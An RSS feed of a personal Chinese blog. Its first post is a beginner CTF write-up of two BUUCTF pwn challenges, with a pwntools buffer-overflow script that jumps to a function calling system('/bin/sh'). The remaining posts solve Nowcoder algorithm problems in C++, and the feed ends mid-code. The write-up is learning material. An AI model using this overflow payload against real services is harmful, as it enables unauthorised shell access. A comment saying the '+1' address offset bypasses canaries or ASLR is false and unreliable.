<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>cj_li&#39;s blog</title>
    <link>https://cjliblog.top/</link>
    
    <image>
      <url>https://www.gravatar.com/avatar/9a30667a06f9e54b4502c81e69456aa3</url>
      <title>cj_li&#39;s blog</title>
      <link>https://cjliblog.top/</link>
    </image>
    
    <atom:link href="https://cjliblog.top/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>新的开始</description>
    <pubDate>Fri, 25 Aug 2023 03:19:28 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>test_your_nc1  rip1 做题记录</title>
      <link>https://cjliblog.top/2023/08/25/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%950824/</link>
      <guid>https://cjliblog.top/2023/08/25/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%950824/</guid>
      <pubDate>Thu, 24 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<p>buuctf：</p><p>前言：算法题还是要刷的，但是我决定走CTF的路了。前段时间在入门WEB，然后忘记了记录博客。目前对自己的定位是一个misc，对web和pwn有一定理解，也可以在比赛中可以在自己的领域外发挥一些作用。所以我要开始入门pwn，但我的基础薄弱，是一个入门比较缓慢的过程，因此开始记录自己的做题情况，养成一个好习惯。</p><h2 id="test-your-nc1-做题记录"><a href="#test-your-nc1-做题记录" class="headerlink" title="test_your_nc1 做题记录"></a>test_your_nc1 做题记录</h2><h6 id="2023-08-23"><a href="#2023-08-23" class="headerlink" title="2023-08-23"></a>2023-08-23</h6><p>**1.**启动靶机，打开ubuntu，terminal，直接输入nc去连接</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc node4.buuoj.cn 29757</span><br><span class="line"><span class="comment">#端口号按照自己的靶机改</span></span><br></pre></td></tr></table></figure><p>**2.**获取flag</p><p>输入ls，看到了flag，输入cat flag，得到flag。</p><h2 id="rip1-做题记录"><a href="#rip1-做题记录" class="headerlink" title="rip1 做题记录"></a>rip1 做题记录</h2><h6 id="2023-08-24"><a href="#2023-08-24" class="headerlink" title="2023-08-24"></a>2023-08-24</h6><h6 id><a href="#" class="headerlink" title></a></h6><p>**1.**分析：</p><p>先把vuln放在ubuntu的桌面，在桌面打开terminal，输入“checksec vuln”来检查它是否受保护。</p><p>把vuln在ubuntu中拖入terminal进行玩耍，他会要求输入一些东西，</p><p>比如输入一个123试试，感受一下它的交互。</p><p>将附件vuln拖入windows的IDA分析，需要注意的函数有：main函数 和 <strong>列表中</strong>main下面的fun函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数中，我们注意gets函数是一个危险函数，它对字符串的输入是可以无限长，然后溢出的，而溢出正是pwn的主线。</p><p>其中s数组是关键，我们点开s进行查看。</p><p>-000000000000000F s               db ?<br>-000000000000000E                 db ? ; undefined<br>-000000000000000D                 db ? ; undefined<br>-000000000000000C                 db ? ; undefined<br>-000000000000000B                 db ? ; undefined<br>-000000000000000A                 db ? ; undefined<br>-0000000000000009                 db ? ; undefined<br>-0000000000000008                 db ? ; undefined<br>-0000000000000007                 db ? ; undefined<br>-0000000000000006                 db ? ; undefined<br>-0000000000000005                 db ? ; undefined<br>-0000000000000004                 db ? ; undefined<br>-0000000000000003                 db ? ; undefined<br>-0000000000000002                 db ? ; undefined<br>-0000000000000001                 db ? ; undefined</p><p>我们会看到这样一段s数组的存储空间，从1到15编号，因此我们需要输入15个字符就可以把数组s填满。</p><p>另外，在main的IDA视图开头，我们看到了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push    rbp</span><br></pre></td></tr></table></figure><p>说明rbp被先压进去了，我们需要把rbp也填充满。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fun</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此函数中，&#x2F;bin&#x2F;sh是个经典shell，是我们获取控制权的关键。</p><p>分析完毕，开始编写代码</p><p>**3.**python脚本的编写</p><p>在ubuntu中使用vscode</p><p>创建一个文件夹，创建文件1.py</p><p>整理后如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用pwntool工具，*表示调入所有内容。</span></span><br><span class="line"><span class="comment">#在这之前需要安装pwntool包，以下函数基本都是pwntool中的</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh链接node4.buuoj.cn:25521靶机。</span></span><br><span class="line"><span class="comment">#注意使用空格使代码美观，增加代码可读性</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25521</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#负载，b表示使用byte类型，（pwntools一般都是用byte操作）将数组s用15个A</span></span><br><span class="line"><span class="comment">#填充rbp，64位需要8个字符（一个字符8位），32位需要4个字符</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">15</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x401186</span>+<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p64函数表示转化为六十四位byte，而括号里是fun函数的地址（IDA视图有注释）</span></span><br><span class="line"><span class="string">+1是为了绕过一些安全机制，如栈溢出保护（Stack Canaries）或地址空间布局随机化（ASLR）。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">当 ASLR 机制开启时，系统会将函数的地址随机化，使得攻击者很难准确预测函数地址的位置。通过在返回地址中加上一个常数（如 +1），攻击者可以试图绕过随机化，使攻击更加稳定。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#发送函数</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#暂停并进入交互的函数</span></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>另外，如果是执着于本地调试，我们可以这样：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Connect to the process</span></span><br><span class="line">r = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Offset calculation</span></span><br><span class="line"><span class="comment">#rbp末尾-（rsp+1），其中esp+1是参数起始位置。</span></span><br><span class="line"><span class="comment">#RSP代表“注册堆栈指针，RBP代表“注册基指针”。</span></span><br><span class="line">offset = <span class="number">0x7fffffffe7a8</span> - <span class="number">0x7fffffffe791</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Function address</span></span><br><span class="line">fun = <span class="number">0x0000000000401186</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p64(fun)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send the payload</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interact with the process</span></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>**4.**获取flag</p><p>输入ls，发现flag，输入cat flag，完成flag的获取。</p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTF做题记录</category>
      
      
      <comments>https://cjliblog.top/2023/08/25/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%950824/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NC16593铺地毯</title>
      <link>https://cjliblog.top/2023/08/13/NC16593%E9%93%BA%E5%9C%B0%E6%AF%AF/</link>
      <guid>https://cjliblog.top/2023/08/13/NC16593%E9%93%BA%E5%9C%B0%E6%AF%AF/</guid>
      <pubDate>Sat, 12 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<p>题目来源：<a href="https://ac.nowcoder.com/acm/problem/16589">https://ac.nowcoder.com/acm/problem/16593</a></p><p><code>hello</code></p><p>思路：</p><p>就是把每一组地毯存到二维数组里，一行代表一张地毯。</p><p>然后自上而下判断某点的地毯，得到的马上break，就是最上面的。</p><p>首先进行存储：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> n,res;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10000</span>][<span class="number">10000</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自上而下进行check操作，判断某张毯子是否是答案：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x,y;</span><br><span class="line">cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">check</span>(a[i],x,y))&#123;</span><br><span class="line">        res=i;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>check稍微用了一下指针，也可以直接用下标的：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span>* p,<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((*p&lt;=x&amp;&amp;(*(p+<span class="number">2</span>)+*p)&gt;=x)&amp;&amp;(*(p+<span class="number">1</span>)&lt;=y&amp;&amp;(*(p+<span class="number">3</span>)+*(p+<span class="number">1</span>)&gt;=y)))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出答案需要+1，因为毯子从1开始：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">cout&lt;&lt;res+<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>就OK辽！</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span>* p,<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((*p&lt;=x&amp;&amp;(*(p+<span class="number">2</span>)+*p)&gt;=x)&amp;&amp;(*(p+<span class="number">1</span>)&lt;=y&amp;&amp;(*(p+<span class="number">3</span>)+*(p+<span class="number">1</span>)&gt;=y)))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,res;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10000</span>][<span class="number">10000</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">            cin&gt;&gt;a[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> x,y;</span><br><span class="line">    cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check</span>(a[i],x,y))&#123;</span><br><span class="line">            res=i;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;res+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/%E7%89%9B%E5%AE%A2%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%B2%BE%E9%80%89/">牛客算法基础精选</category>
      
      
      <comments>https://cjliblog.top/2023/08/13/NC16593%E9%93%BA%E5%9C%B0%E6%AF%AF/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NC16589机器翻译【题解】【入门向】</title>
      <link>https://cjliblog.top/2023/08/05/NC16589%E6%9C%BA%E5%99%A8%E7%BF%BB%E8%AF%91/</link>
      <guid>https://cjliblog.top/2023/08/05/NC16589%E6%9C%BA%E5%99%A8%E7%BF%BB%E8%AF%91/</guid>
      <pubDate>Fri, 04 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<p>题目来源：<a href="https://ac.nowcoder.com/acm/problem/16589">机器翻译</a></p><p><code>hello</code></p><p>首先明确需求：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一个内存，输入，存储查字典次数的变量</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt;a;<span class="comment">//内存容器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">    cin&gt;&gt;b[i];<span class="comment">//输入</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ans=<span class="number">0</span>;<span class="comment">//存储查字典次数的变量</span></span><br></pre></td></tr></table></figure><p>在循环内，我们需要知道是否内存内有和输入重复的元素：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> it=a.<span class="built_in">begin</span>();it!=a.<span class="built_in">end</span>();it++) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(*it==b[i]) flag=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果没有重复，我会push进一个输入：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(flag) </span><br><span class="line">&#123;</span><br><span class="line">    a.<span class="built_in">push_back</span>(b[i]);ans++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，如果内存达到上限，我会把内存第一个元素删掉：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(a.<span class="built_in">size</span>()==m+<span class="number">1</span>) a.<span class="built_in">erase</span>(a.<span class="built_in">begin</span>());</span><br></pre></td></tr></table></figure><p>就OK辽！</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一个内存，输入，存储查字典次数的变量</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;a;</span><br><span class="line">    <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> m,n;</span><br><span class="line">    cin&gt;&gt;m&gt;&gt;n;</span><br><span class="line">    <span class="type">int</span> b[<span class="number">10000</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">bool</span> flag=<span class="number">1</span>;</span><br><span class="line">        cin&gt;&gt;b[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> it=a.<span class="built_in">begin</span>();it!=a.<span class="built_in">end</span>();it++) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(*it==b[i]) flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag) </span><br><span class="line">        &#123;</span><br><span class="line">            a.<span class="built_in">push_back</span>(b[i]);ans++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a.<span class="built_in">size</span>()==m+<span class="number">1</span>) a.<span class="built_in">erase</span>(a.<span class="built_in">begin</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/.top//11953\desktop\hahahaha.jpg" alt="hahahaha"></p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/%E7%89%9B%E5%AE%A2%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%B2%BE%E9%80%89/">牛客算法基础精选</category>
      
      
      <comments>https://cjliblog.top/2023/08/05/NC16589%E6%9C%BA%E5%99%A8%E7%BF%BB%E8%AF%91/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NC16622多项式输出【题解】【入门向】</title>
      <link>https://cjliblog.top/2023/08/04/NC16622%E5%A4%9A%E9%A1%B9%E5%BC%8F%E8%BE%93%E5%87%BA/</link>
      <guid>https://cjliblog.top/2023/08/04/NC16622%E5%A4%9A%E9%A1%B9%E5%BC%8F%E8%BE%93%E5%87%BA/</guid>
      <pubDate>Thu, 03 Aug 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;题目来源：&lt;a href=&quot;https://ac.nowcoder.com/acm/problem/16622&quot;&gt;多项式输出&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这道题在做的时候给自己挖了个坑，其实把符号、系数、指数分开来看会更好实现。&lt;/p&gt;
&lt;p&gt;这里先给出不断调试给出的答案，思路不</description>
        
      
      
      
      <content:encoded><![CDATA[<p>题目来源：<a href="https://ac.nowcoder.com/acm/problem/16622">多项式输出</a></p><p>这道题在做的时候给自己挖了个坑，其实把符号、系数、指数分开来看会更好实现。</p><p>这里先给出不断调试给出的答案，思路不是一蹴而就的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一</span><br><span class="line">输入：</span><br><span class="line">5</span><br><span class="line">100 -1 1 -3 0 10</span><br><span class="line">输出：</span><br><span class="line">100x^5-x^4+x^3-3x^2+10</span><br><span class="line"></span><br><span class="line">二</span><br><span class="line">输入：</span><br><span class="line">3</span><br><span class="line">输出：</span><br><span class="line">-50 0 0 1</span><br><span class="line">-50x^3+1</span><br></pre></td></tr></table></figure><p>首先看到示例。这样的示例是不够的，因为指数为1的时候x后面是不带“^”的，但是此处并未给出指数为1时的示例，因此可以自己给出一个综合性比较强的调试示例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">三</span><br><span class="line">输入：</span><br><span class="line">5</span><br><span class="line">0 -1 1 10 0 1 -1</span><br><span class="line">输出：</span><br><span class="line">-x^4+x^3+10x^2+1</span><br></pre></td></tr></table></figure><p>开始our 工程！</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="type">int</span> cnt=n;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10000</span>];</span><br></pre></td></tr></table></figure><p>首先进行输入的读取，存到n，由于这个n是题目给出的常量，最好不要动，所以我们用cnt来作为变量暂时存储n，以备不时之需。另外根据示例，我们需要输入n+1个指数，因此用数组来存储。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    cnt++;</span><br><span class="line">    <span class="keyword">while</span>(cnt--)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此处使用了一个简单的while循环来输入存储数组，cnt充当计数君，不要忘记有n+1个数据所以要先cnt++</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">    cnt=n;</span><br><span class="line">    <span class="type">int</span> meiyoufuhao=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            meiyoufuhao=i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=<span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i==meiyoufuhao)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])!=<span class="number">1</span>) cout&lt;&lt;a[i];</span><br><span class="line">                <span class="keyword">if</span>(a[i]==<span class="number">-1</span>) cout&lt;&lt;<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(a[i]&gt;<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&#x27;+&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])!=<span class="number">1</span>||a[i]==<span class="number">1</span>&amp;&amp;cnt==<span class="number">0</span>) cout&lt;&lt;a[i];</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])!=<span class="number">1</span>) cout&lt;&lt;a[i];</span><br><span class="line">                <span class="keyword">if</span>(a[i]==<span class="number">-1</span>) </span><br><span class="line">                &#123;</span><br><span class="line">                    cout&lt;&lt;<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(cnt==<span class="number">0</span>) cout&lt;&lt;<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=<span class="number">0</span>&amp;&amp;!cnt==<span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;x^&quot;</span>&lt;&lt;cnt;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt--;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的实现都在这里了其中meiyoufuhao是没有符号的意思，记录第一个系数不为0的家伙的位置，让它不能带加号。其余的就按照基本的数学尝试实现了，一大堆的if语句，这里我因为前期思考不够，导致分类起来比较复杂。后续会再拿出一个版本上传。</p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/%E7%89%9B%E5%AE%A2%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%B2%BE%E9%80%89/">牛客算法基础精选</category>
      
      
      <comments>https://cjliblog.top/2023/08/04/NC16622%E5%A4%9A%E9%A1%B9%E5%BC%8F%E8%BE%93%E5%87%BA/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NC16644字符串的展开【题解】【入门向】</title>
      <link>https://cjliblog.top/2023/08/02/NC16644%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%B1%95%E5%BC%80/</link>
      <guid>https://cjliblog.top/2023/08/02/NC16644%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%B1%95%E5%BC%80/</guid>
      <pubDate>Tue, 01 Aug 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt; 题目来源【牛客竞赛】：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ac.nowcoder.com/acm/problem/16644&quot;&gt;https://ac.nowcoder.com/acm/problem/16644&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;题解：&lt;/p&gt;
&lt;fig</description>
        
      
      
      
      <content:encoded><![CDATA[<p> 题目来源【牛客竞赛】：</p><p><a href="https://ac.nowcoder.com/acm/problem/16644">https://ac.nowcoder.com/acm/problem/16644</a></p><p>题解：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//引入下面有用到的函数</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isok</span><span class="params">(<span class="type">char</span> a,<span class="type">char</span> b)</span></span>;</span><br><span class="line"><span class="function">string <span class="title">func</span><span class="params">(<span class="type">const</span> string&amp; p,<span class="type">int</span> p1,<span class="type">int</span> p2,<span class="type">int</span> p3)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//喜欢简短主函数，给人清爽的感觉</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="comment">//清楚缓冲区之后再进行读取一整行字符串,也可以把该行直接改成cin&gt;&gt;string</span></span><br><span class="line">    cin.<span class="built_in">ignore</span>();<span class="built_in">getline</span>(cin,s);</span><br><span class="line">    <span class="comment">//func是一个主要功能实现的函数，把所有参数往里面塞</span></span><br><span class="line">    string ans=<span class="built_in">func</span>(s,a,b,c);</span><br><span class="line">    cout&lt;&lt;ans;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这是一个判断前后两数是否同为字母或同为数字的函数</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isok</span><span class="params">(<span class="type">char</span> a,<span class="type">char</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isdigit</span>(a)&amp;&amp;<span class="built_in">isdigit</span>(b))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isalpha</span>(a)&amp;&amp;<span class="built_in">isalpha</span>(b))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function">string <span class="title">func</span><span class="params">(<span class="type">const</span> string&amp; p,<span class="type">int</span> p1,<span class="type">int</span> p2,<span class="type">int</span> p3)</span></span>&#123;</span><br><span class="line">    <span class="comment">//r作为临时存储单个填充串</span></span><br><span class="line">    string r=<span 